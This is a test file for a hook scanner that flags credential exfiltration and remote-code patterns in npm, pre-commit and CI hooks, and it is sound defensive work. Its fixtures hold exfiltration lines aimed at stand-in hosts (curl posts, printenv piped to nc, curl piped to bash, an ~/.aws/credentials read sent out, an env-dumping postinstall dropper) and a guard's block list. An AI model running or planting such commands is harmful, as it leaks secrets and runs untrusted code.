/**
 * Round 2 validation regressions (validation/problems.md P-018, P-019,
 * P-020, and the hookcheck half of P-014). Every fixture is built from a
 * real driver measured in Round 2 against the published 0.1.3 binary on
 * real repos (langfuse, PostHog/posthog-js, Smart-AI-Memory/attune-ai,
 * codingagentsystem/cas, jpoley/flowspec, simonw/simonwillisonblog,
 * sveltejs/kit). Static scans only: fixture code is never executed.
 */
import { describe, it, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { classifyCommand, computeVerdict, renderReport, scanHooks } from "../src/core.js";
import type { HookFinding } from "../src/types.js";

function fixture(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "hookcheck-r2-"));
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, content);
  }
  return dir;
}
const dirs: string[] = [];
function fx(files: Record<string, string>): string { const d = fixture(files); dirs.push(d); return d; }
after(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

function finding(over: Partial<HookFinding>): HookFinding {
  return { id: "a", file: "f", source: "package.json", hook: "h", command: "x", classification: "RISKY", rules: [], evidence: "", ...over };
}

function workflowWithStep(stepYaml: string, extra: Record<string, string> = {}): string {
  return fx({
    ".github/workflows/ci.yml": `name: ci\non: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n${stepYaml}`,
    ...extra,
  });
}

describe("P-018: ENV-EXFIL requires the credential value to flow into a send", () => {
  it("langfuse shape: own token in the push URL userinfo is authentication, not exfil", () => {
    const r = classifyCommand('git push "https://x-access-token:${GH_ACCESS_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" +main:production');
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("posthog-js shape: workflow dispatch with Authorization Bearer and a metadata body is not exfil", () => {
    const step = [
      "curl -f -sS -X POST \\",
      '     -H "Accept: application/vnd.github+json" \\',
      '     -H "Authorization: Bearer $GITHUB_TOKEN" \\',
      "     https://api.github.com/repos/posthog/posthog-js/actions/workflows/posthog-upgrade.yml/dispatches \\",
      '     -d "$(jq -n --arg ref "main" --arg package_name "$PACKAGE_NAME" --arg package_version "$PACKAGE_VERSION" \'{ref: $ref, inputs: {package_name: $package_name, package_version: $package_version}}\')"',
    ].join("\n");
    const r = classifyCommand(step);
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("posthog-js shape: Slack status post with the bot token in the Authorization header is not exfil", () => {
    const step = [
      'text="$prefix posthog-js@$PACKAGE_VERSION recovery: $DETAIL"',
      'response=$(curl -sS -X POST \'https://slack.com/api/chat.postMessage\' \\',
      '    -H "Authorization: Bearer $SLACK_BOT_TOKEN" \\',
      "    -H 'Content-Type: application/json; charset=utf-8' \\",
      '    --data "$(jq -n --arg channel "$SLACK_CHANNEL_ID" --arg text "$text" \'{channel: $channel, text: $text}\')")',
    ].join("\n");
    const r = classifyCommand(step);
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("cas shape: token presence check, own tarball download, own tap clone with userinfo token is not exfil", () => {
    const step = [
      'if [ -z "${GH_TOKEN}" ]; then',
      '  echo "HOMEBREW_TAP_TOKEN not set, skipping homebrew update"',
      "  exit 0",
      "fi",
      'MACOS_SHA=$(curl -fsSL "https://github.com/${{ github.repository }}/releases/download/v${VERSION}/cas-aarch64-apple-darwin.tar.gz" | shasum -a 256 | cut -d\' \' -f1)',
      "git clone https://x-access-token:${GH_TOKEN}@github.com/owner/homebrew-cas.git tap",
    ].join("\n");
    const r = classifyCommand(step);
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("attune shape: token presence check plus gh opening its own PR is not exfil", () => {
    const step = [
      "set -e",
      'if [ -z "$GH_TOKEN_RAW" ]; then',
      '  echo "::error::ADMIN_MERGE_TOKEN is not set - cannot open a PR"',
      "  exit 1",
      "fi",
      "GH_TOKEN=$(printf '%s' \"$GH_TOKEN_RAW\" | tr -d '[:space:]')",
      "export GH_TOKEN",
      'gh pr create --repo owner/attune --title "snapshot" --body "captured"',
    ].join("\n");
    const r = classifyCommand(step);
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("flowspec shape: co-occurrence across one big referenced file is not exfil", () => {
    // The version-check step greps a 10k line CLI in the real repo; the
    // file reads its own GITHUB_TOKEN, copies os.environ for a subprocess,
    // and contains URLs inside a doc template. None of that is a send of
    // the token anywhere.
    const dir = workflowWithStep(
      "      - run: |\n          grep '__version__' src/bigcli.py\n          python3 src/bigcli.py --check\n",
      {
        "src/bigcli.py": [
          "import os, subprocess",
          "",
          'TOKEN = os.environ.get("GITHUB_TOKEN")',
          "",
          'DOCS = """',
          "Templates live at https://github.com/owner/project and https://docs.example.com/guide.",
          '"""',
          "",
          "def run(cmd):",
          "    env = dict(os.environ)",
          "    return subprocess.run(cmd, env=env, capture_output=True)",
          "",
        ].join("\n"),
      },
    );
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.source === "github-workflow");
    assert.ok(f);
    assert.ok(!f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
    assert.notEqual(r.verdict, "COMPROMISED-PATTERN", `verdict was ${r.verdict}`);
  });

  it("computeVerdict: env reference plus a URL is REVIEW now, credential store plus a send stays COMPROMISED", () => {
    // Round 2 calibration (P-018): a credential shaped env name and a URL
    // co-occurring in one finding is the normal shape of a repo's own
    // authenticated automation. The verdict needs a severe rule, the
    // flow-verified ENV-EXFIL rule, or credential STORE access combined
    // with network behavior.
    assert.equal(computeVerdict([finding({ rules: ["ENV-ACCESS", "REMOTE-URL"] })]), "REVIEW");
    assert.equal(computeVerdict([finding({ rules: ["ENV-BULK", "NET-FETCH"] })]), "REVIEW");
    assert.equal(computeVerdict([finding({ rules: ["CRED-ACCESS", "NET-FETCH"] })]), "COMPROMISED-PATTERN");
    assert.equal(computeVerdict([finding({ rules: ["CRED-ACCESS", "REMOTE-URL"] })]), "COMPROMISED-PATTERN");
    assert.equal(computeVerdict([finding({ rules: ["ENV-EXFIL"] })]), "COMPROMISED-PATTERN");
  });

  it("a credential value posted as the request body is exfil", () => {
    const r = classifyCommand('curl -s -d "$GITHUB_TOKEN" https://collector.example.invalid/x');
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("a credential value in a URL query string is exfil", () => {
    const r = classifyCommand('curl -s "https://collector.example.invalid/c?t=${API_KEY}"');
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("a bulk env dump piped into netcat is exfil", () => {
    const r = classifyCommand("printenv | nc collector.example.invalid 4444");
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("a credential value echoed into a curl stdin body is exfil", () => {
    const r = classifyCommand('echo "$AWS_SECRET_ACCESS_KEY" | curl -s -d @- https://collector.example.invalid/');
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("a credential value printed while a send happens in the same step is exfil", () => {
    const step = [
      'echo "debug: token is $MY_API_TOKEN"',
      "curl -s https://api.github.com/repos/owner/repo > /dev/null",
    ].join("\n");
    const r = classifyCommand(step);
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("variable indirection: env value assigned then posted as a fetch body is exfil and COMPROMISED", () => {
    const dir = fx({
      "package.json": JSON.stringify({ scripts: { postinstall: "node setup.mjs" } }),
      "setup.mjs": 'const leak = process.env.MY_API_SECRET;\nawait fetch("https://collector.example.invalid/", { method: "POST", body: leak });\n',
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.hook === "postinstall");
    assert.ok(f);
    assert.ok(f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
    assert.equal(r.verdict, "COMPROMISED-PATTERN");
  });

  it("the A1 dropper shape keeps ENV-EXFIL through the payload variable", () => {
    const dir = fx({
      "package.json": JSON.stringify({ scripts: { postinstall: "node setup.mjs" } }),
      "setup.mjs": 'const payload = JSON.stringify({ env: process.env, fakeToken: "FAKE_TOKEN_NOT_REAL" });\nawait fetch("https://collector.example.invalid/exfil", { method: "POST", body: payload });\n',
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.hook === "postinstall");
    assert.ok(f);
    assert.ok(f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
    assert.equal(r.verdict, "COMPROMISED-PATTERN");
  });
});

describe("P-018 addendum (found in the v0.1.4 re-validation): prose must not taint variables or open the print branch", () => {
  it("flowspec shape: a CLI that reads its token for API auth, copies env for subprocesses, and prints prose is not exfil", () => {
    // Reduced from jpoley/flowspec src/flowspec_cli/__init__.py (10,565
    // lines): the token goes into an Authorization header built by a
    // helper, os.environ is copied for subprocess env, the docs say the
    // word Fetch, and banner prints mention token and env in prose. The
    // v0.1.4 print branch fired here: the word Fetch in a docstring
    // counted as a send construct, and variable names tainted through
    // prose mentions made a banner print look like disclosure.
    const dir = fx({
      ".pre-commit-config.yaml": "repos:\n- repo: local\n  hooks:\n  - id: x\n    entry: python3 tool.py\n",
      "tool.py": [
        '"""CLI helpers.',
        "",
        "We fetch release metadata. GitHub token for API requests.",
        '"""',
        "import os",
        "",
        'token = os.getenv("GITHUB_TOKEN")',
        "env = os.environ.copy()",
        "",
        "def build(",
        "    verbose=False,",
        '    help="GitHub token for API requests",',
        "):",
        '    print("Run \'tool --help\' for usage information")',
        "",
      ].join("\n"),
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.source === "pre-commit");
    assert.ok(f);
    assert.ok(!f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
    assert.notEqual(r.verdict, "COMPROMISED-PATTERN");
  });

  it("a variable named in a prose string is not tainted by the mention", () => {
    const dir = fx({
      ".pre-commit-config.yaml": "repos:\n- repo: local\n  hooks:\n  - id: x\n    entry: python3 tool.py\n",
      "tool.py": [
        '"""Configuration helpers. We fetch defaults. GitHub token for API requests."""',
        "import os",
        "",
        'token = os.getenv("GITHUB_TOKEN")',
        'help = "Use the token to authenticate"',
        "print(help)",
        "",
      ].join("\n"),
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.source === "pre-commit");
    assert.ok(f);
    assert.ok(!f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
  });

  it("control: printing a credential variable next to a real send still fires ENV-EXFIL (JS)", () => {
    const dir = fx({
      "package.json": JSON.stringify({ scripts: { postinstall: "node leak.mjs" } }),
      "leak.mjs": 'const t = process.env.MY_TOKEN;\nconsole.log("leaking", t);\nawait fetch("https://collector.example.invalid/");\n',
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.hook === "postinstall");
    assert.ok(f);
    assert.ok(f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
  });

  it("control: an f-string interpolation of a credential variable next to a real send still fires ENV-EXFIL (Python)", () => {
    const dir = fx({
      ".pre-commit-config.yaml": "repos:\n- repo: local\n  hooks:\n  - id: x\n    entry: python3 tool.py\n",
      "tool.py": [
        "import os, requests",
        "",
        'token = os.getenv("GITHUB_TOKEN")',
        'print(f"debug token: {token}")',
        'requests.post("https://api.example.com/hook", data={"a": 1})',
        "",
      ].join("\n"),
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.source === "pre-commit");
    assert.ok(f);
    assert.ok(f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
  });
});

describe("P-019: severe rules do not match patterns quoted inside defensive tooling", () => {
  const guardPy = [
    '"""Defensive PreToolUse guard: blocks dangerous shell commands."""',
    "import re, sys, json",
    "",
    "DANGEROUS_PATTERNS = [",
    '    r"eval\\s*\\(",',
    '    r"\\b(curl|wget)\\b[^|]*\\|\\s*(sh|bash)",',
    '    r"Invoke-Expression",',
    '    r"base64\\s+(-d|--decode)",',
    '    r"cat\\s+~/\\.ssh/id_rsa",',
    "]",
    "BLOCKED_PATHS = [",
    '    "~/.aws/credentials",',
    '    "~/.ssh/id_rsa",',
    "]",
    "",
    "def main():",
    "    data = json.load(sys.stdin)",
    '    cmd = data.get("tool_input", {}).get("command", "")',
    "    for pat in DANGEROUS_PATTERNS:",
    "        if re.search(pat, cmd):",
    '            print("blocked", file=sys.stderr)',
    "            sys.exit(2)",
    "",
    'if __name__ == "__main__":',
    "    main()",
    "",
  ].join("\n");

  it("attune shape: test payloads piped into a pattern-quoting guard do not classify the guard as an attacker", () => {
    const step = [
      "      - run: |",
      '          echo \'{"tool_name":"Bash","tool_input":{"command":"ls"}}\' \\',
      "            | python src/attune/hooks/scripts/security_guard.py",
      '          echo \'{"tool_name":"Bash","tool_input":{"command":"eval(x)"}}\' \\',
      "            | python src/attune/hooks/scripts/security_guard.py && exit 1 || test $? -eq 2",
    ].join("\n");
    const dir = workflowWithStep(step, { "src/attune/hooks/scripts/security_guard.py": guardPy });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.source === "github-workflow");
    assert.ok(f);
    for (const rule of ["REMOTE-EVAL", "NET-FETCH", "OBFUSCATION", "CRED-ACCESS", "CURL-PIPE-SH", "DECODE-PIPE-SH"]) {
      assert.ok(!f.rules.includes(rule), `guard shape fired ${rule}: ${f.rules.join(",")}`);
    }
    assert.notEqual(f.classification, "RISKY", `classification was ${f.classification} with ${f.rules.join(",")}`);
    assert.notEqual(r.verdict, "COMPROMISED-PATTERN");
  });

  it("a JS guard with regex literals quoting the same patterns fires nothing either", () => {
    const dir = fx({
      "package.json": JSON.stringify({ scripts: { postinstall: "node guard.mjs" } }),
      "guard.mjs": "const BLOCKED = [/eval\\(/, /\\bcurl\\b.*\\|\\s*sh/, /base64\\s+-d/];\nconst WORDS = [\"eval(\", \"curl\", \"wget\", \"Invoke-Expression\"];\nconsole.log(BLOCKED.length + WORDS.length);\n",
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.hook === "postinstall");
    assert.ok(f);
    for (const rule of ["REMOTE-EVAL", "NET-FETCH", "OBFUSCATION", "CURL-PIPE-SH", "DECODE-PIPE-SH"]) {
      assert.ok(!f.rules.includes(rule), `regex literal guard fired ${rule}: ${f.rules.join(",")}`);
    }
    assert.notEqual(f.classification, "RISKY", `classification was ${f.classification}`);
  });

  it("control: the same tokens as real code in a referenced JS file still fire", () => {
    const dir = fx({
      "package.json": JSON.stringify({ scripts: { postinstall: "node run.mjs" } }),
      "run.mjs": 'const { execSync } = require("child_process");\nexecSync("curl https://e.example/x.sh | bash");\n',
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.hook === "postinstall");
    assert.ok(f);
    assert.ok(f.rules.includes("CURL-PIPE-SH"), `rules: ${f.rules.join(",")}`);
    assert.equal(r.verdict, "COMPROMISED-PATTERN");
  });

  it("control: the same tokens as real code in a referenced Python file still fire", () => {
    const dir = fx({
      ".pre-commit-config.yaml": "repos:\n- repo: local\n  hooks:\n  - id: x\n    entry: python3 hook.py\n",
      "hook.py": 'import os\nos.system("curl https://e.example/x.sh | sh")\n',
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.source === "pre-commit");
    assert.ok(f);
    assert.ok(f.rules.includes("CURL-PIPE-SH"), `rules: ${f.rules.join(",")}`);
    assert.equal(r.verdict, "COMPROMISED-PATTERN");
  });

  it("control: reading a real credential file in a referenced file still fires CRED-ACCESS", () => {
    const dir = fx({
      "package.json": JSON.stringify({ scripts: { postinstall: "node setup.mjs" } }),
      "setup.mjs": 'const fs = require("fs"); const creds = fs.readFileSync(process.env.HOME + "/.aws/credentials", "utf8"); await fetch("https://collector.example.invalid/x", { method: "POST", body: creds });',
    });
    const r = scanHooks(dir);
    const f = r.findings.find((x) => x.hook === "postinstall");
    assert.ok(f);
    assert.ok(f.rules.includes("CRED-ACCESS"), `rules: ${f.rules.join(",")}`);
    assert.equal(r.verdict, "COMPROMISED-PATTERN");
  });
});

describe("P-020: env rules match reads, not unsets or write-with-default helpers", () => {
  it("Django stock manage.py: os.environ.setdefault is not bulk access", () => {
    const dir = workflowWithStep(
      "      - run: python manage.py test\n",
      {
        "manage.py": [
          "#!/usr/bin/env python",
          "import os, sys",
          "",
          "def main():",
          '    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "config.settings")',
          "    from django.core.management import execute_from_command_line",
          "    execute_from_command_line(sys.argv)",
          "",
          'if __name__ == "__main__":',
          "    main()",
          "",
        ].join("\n"),
      },
    );
    const r = scanHooks(dir);
    for (const f of r.findings) {
      assert.ok(!f.rules.includes("ENV-BULK"), `${f.file} fired ENV-BULK: ${f.evidence}`);
    }
    const step = r.findings.find((x) => x.source === "github-workflow");
    assert.ok(step);
    assert.notEqual(step.classification, "RISKY", `step rules: ${step.rules.join(",")}`);
  });

  it("env -u NAME unsets a variable; it does not read it", () => {
    const r = classifyCommand("env -u NETLIFY_AUTH_TOKEN -u NETLIFY_PROJECT_ID netlify deploy --dir=build");
    assert.ok(!r.rules.includes("ENV-ACCESS"), `rules: ${r.rules.join(",")}`);
    assert.ok(!r.rules.includes("ENV-BULK"), `rules: ${r.rules.join(",")}`);
  });

  it("os.environ.pop is a removal, not bulk access", () => {
    const r = classifyCommand('python3 -c "import os; os.environ.pop(\'X\')"');
    assert.ok(!r.rules.includes("ENV-BULK"), `rules: ${r.rules.join(",")}`);
  });

  it("controls: whole environment serialization and dumps still fire ENV-BULK", () => {
    for (const cmd of [
      'python3 -c "import os, json; print(json.dumps(dict(os.environ)))"',
      'python3 -c "import os; print(str(os.environ))"',
      "printenv | sort",
    ]) {
      const r = classifyCommand(cmd);
      assert.ok(r.rules.includes("ENV-BULK"), `"${cmd}" rules: ${r.rules.join(",")}`);
    }
  });

  it("a bare uppercase word in prose is not an env read", () => {
    const r = classifyCommand('echo "ADMIN_MERGE_TOKEN is not set - cannot open a PR"');
    assert.ok(!r.rules.includes("ENV-ACCESS"), `rules: ${r.rules.join(",")}`);
  });
});

describe("P-014 hookcheck half: an empty estate says so", () => {
  it("a scan with no hooks carries a note in the report object and the JSON shape", () => {
    const dir = fx({ "README.md": "hello" });
    const r = scanHooks(dir);
    assert.equal(r.counts.total, 0);
    assert.ok(typeof r.note === "string" && r.note.length > 0, "note missing on empty report");
    assert.match(r.note!, /nothing (was )?found to audit/i);
    const roundTripped = JSON.parse(JSON.stringify(r)) as { note?: string };
    assert.equal(roundTripped.note, r.note);
  });

  it("the human renderer prints the note", () => {
    const dir = fx({ "README.md": "hello" });
    const out = renderReport(scanHooks(dir));
    assert.match(out, /nothing (was )?found to audit/i);
  });

  it("a scan that found hooks carries no empty-estate note", () => {
    const dir = fx({ "package.json": JSON.stringify({ scripts: { postinstall: "node ok.js" } }) });
    const r = scanHooks(dir);
    assert.ok(r.counts.total >= 1);
    assert.equal(r.note, undefined);
  });

  it("a nonexistent path report also carries the note alongside its warning", () => {
    const r = scanHooks("/tmp/hookcheck-r2-does-not-exist");
    assert.equal(r.counts.total, 0);
    assert.ok(r.warnings.length >= 1);
    assert.ok(typeof r.note === "string" && r.note.length > 0);
  });
});
